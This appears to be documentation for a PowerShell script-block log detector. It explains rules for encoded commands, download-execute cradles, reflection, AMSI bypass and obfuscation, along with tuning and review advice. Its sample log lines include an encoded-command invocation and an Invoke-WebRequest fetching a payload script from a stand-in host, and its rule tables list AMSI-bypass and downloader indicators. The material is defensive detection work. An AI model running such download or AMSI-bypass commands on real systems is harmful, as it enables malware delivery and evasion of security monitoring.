# PowerShell 脚本块日志检测规则（元察 · 元）

分析 Windows 事件日志（Event 4104 / 4103 / CommandInvocation / ScriptBlock 等）中记录的 PowerShell 脚本块 / 命令。本文件说明元察的 PowerShell 检测规则与特征表，供人工复核与调参。

## 输入形态

典型行（Windows 事件日志经导出 / syslog 转发后的文本）：

```
2026-01-05T12:00:01.000Z  Host Application = powershell.exe  ScriptBlock Text = powershell -NoProfile -EncodedCommand SQBFAFgA...
Feb  5 12:00:02 host powershell[1234]: CommandInvocation: Invoke-WebRequest -Uri http://evil.example/payload.ps1
```

引擎通过 `scriptblock` / `commandinvocation` / `eventid=4104` / `eventid=4103` / `powershell` / `scriptblocktext` / `hostapplication=consolehost` / `scopeid=` 等标记自动嗅探出 PowerShell 类行。脚本块文本（ScriptBlock Text / message）作为检测主体，全部转为小写后再做特征匹配。

## 检测规则

| 规则 | 触发条件 | 默认严重度 | 说明 / 复核建议 |
|---|---|---|---|
| encoded_command | 出现 `-EncodedCommand` / `-enc`，或一行内 base64 负载长度 >= 160 | high | 编码命令常用于绕过静态检测执行隐蔽操作；核查对应进程与命令 |
| download_execute | 下载相关命令（Invoke-WebRequest / DownloadString / Start-BitsTransfer / certutil urlcache / WebClient）且同时出现 `http` | critical | 典型的下载器 / 木马投递手法；核查下载目标与后续进程行为 |
| reflection | 出现 `Add-Type` / `[Reflection.Assembly]` / `Assembly::Load` / `GetMethod` / `Activator` | medium | 反射加载 .NET 程序集，常用于内存执行绕过落盘；结合父进程与命令上下文判断 |
| amsi_bypass | 出现 `AmsiUtils` / `amsiInitFailed` / `0x417369` / `System.Management.Automation.AmsiUtils` / `amsibypass` | critical | 试图绕过 AMSI 检测以加载恶意内容；重点核查该进程及后续行为 |
| obfuscation | 出现 `-enc` / `iex` / `FromBase64String` / `Write-Output` / `-replace` / `join` / `powershell -no`，或含 `[char]` / ` -f ` 加 `=` | medium | 混淆手段可能用于规避检测；尝试解码还原后人工核实 |

> 同一脚本块可能同时命中多条规则（如 `-EncodedCommand` + `iex`），此时会输出多条告警——这是正常行为，便于逐条复核，不影响时间线去重。

## 特征表

### 常见命令 / 算子（PS_CMDS）

`Invoke-Expression`（`iex`）、`Invoke-WebRequest`（`iwr`）、`DownloadString`、`Start-BitsTransfer`、`bitsadmin`、`certutil`、`Add-Type`、`New-Object`、`Invoke-Command`、`Register-ScheduledTask`、`Set-Content`、`Out-File`、`Net.WebClient`、`System.Net.WebClient`、`Activation`。

### PowerShell 类标记（POWERSHELL_MARKERS）

`scriptblock`、`commandinvocation`、`eventid=4104`、`eventid 4104`、`eventid=4103`、`eventid 4103`、`powershell`、`scriptblocktext`、`create scriptblock`、`hostapplication=consolehost`、`scopeid=`。

## 阈值与调参

- 编码命令的 base64 阈值（>= 160 字符）用于区分「常规 Base64 编码」与「可疑长负载」；调低更敏感（易误报），调高更稳健。
- PowerShell 检测不依赖时间窗聚合，逐条脚本块判断即可；如误报多，可结合 `--min-severity` 只关注 high / critical。

## 复核建议

- 下载执行（download_execute）与 AMSI 绕过（amsi_bypass）优先级最高，优先排查对应进程、父进程与网络流量；
- 反射加载多为合法框架（如某些 .NET 加载器）也会用到，需结合是否是常见 / 签名程序集判断；
- 混淆特征误报较多：正常运维脚本也可能用 `iex` / `[char]` / `-f` 拼接字符串，应结合上下文（来源、执行账户、是否结合下载执行）判断，避免一刀切告警。
